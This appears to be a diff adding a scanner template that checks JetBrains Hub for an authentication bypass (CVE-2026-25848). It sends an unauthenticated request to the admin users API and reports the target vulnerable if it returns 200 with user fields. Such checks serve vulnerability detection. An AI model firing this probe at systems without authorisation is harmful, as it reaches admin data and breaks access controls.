@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "检测 JetBrains Hub 是否存在认证绕过漏洞（CWE-306）。未经身份认证的远程攻击者可直接访问 REST API 管理接口，绕过登录验证执行管理员操作。通过向管理后台 API 发送未授权请求，若返回 200 而非 401/403 则表明存在漏洞。"
+id = "POC-AVE-2026-0067"
+name = "JetBrains Hub 认证绕过漏洞 PoC"
+severity = "critical"
+tags = ["ave-2026-0067"]
+vuln_id = [
+    "CVE-2026-25848",
+    "AVE-2026-0067",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/rest/admin/users"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "username",
+    "users",
+    "login",
+]
